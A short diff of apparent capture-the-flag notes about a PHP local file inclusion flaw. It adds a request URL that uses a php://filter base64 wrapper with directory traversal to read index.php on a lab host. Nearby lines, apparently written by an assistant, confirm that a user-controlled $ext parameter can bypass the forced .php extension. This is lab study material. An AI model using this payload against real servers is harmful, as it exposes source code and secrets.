@@ -147,6 +147,8 @@ Warning: include(php://filter/read=convert.base64-encode/resource=dog/../index.p
 
 oh double extensions
 
+http://10.201.51.7/?view=php://filter/read=convert.base64-encode/resource=dog/../var/www/html/index.php
+
 URI when fixed to not have extra .php spits out this in base64 encoded form 
 
 <!DOCTYPE HTML>
@@ -190,3 +192,4 @@ so we can set the $ext variable that gets set after the . is appended ourselves?
 Excellent catch — yes, **you can set `$ext` yourself**, because of this line:
 
 `$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';`
+
